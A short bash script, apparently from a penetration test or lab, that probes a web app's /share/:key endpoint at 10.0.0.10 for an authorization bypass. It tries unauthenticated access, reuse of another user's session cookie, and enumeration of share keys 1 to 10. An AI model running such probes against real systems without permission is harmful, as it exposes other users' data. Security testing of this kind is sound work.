#!/bin/bash

# Test share endpoint for authorization bypass
echo "Testing /share/:key endpoint for authorization bypass..."

# Test 1: Access share link without authentication
echo "Test 1: Access share link without auth cookie"
curl -s "http://10.0.0.10/share/testkey" -w "HTTP Status: %{http_code}\n"

echo ""

# Test 2: Access share link with wrong user's cookie
echo "Test 2: Access share link with different user cookie"
curl -s "http://10.0.0.10/share/testkey" \
  -H "Cookie: connect.sid=[different_user_session]" \
  -w "HTTP Status: %{http_code}\n"

echo ""

# Test 3: Try predictable keys
echo "Test 3: Try predictable share keys"
for key in {1..10}; do
  echo -n "Testing key: $key - "
  response=$(curl -s "http://10.0.0.10/share/$key" \
    -H "Cookie: connect.sid=[session]" \
    -w "%{http_code}")
  if [ "$response" = "200" ]; then
    echo "SUCCESS - Key $key works!"
  else
    echo "Failed"
  fi
done

echo ""
echo "If any tests return data without proper authorization, share endpoint has bypass vulnerability."
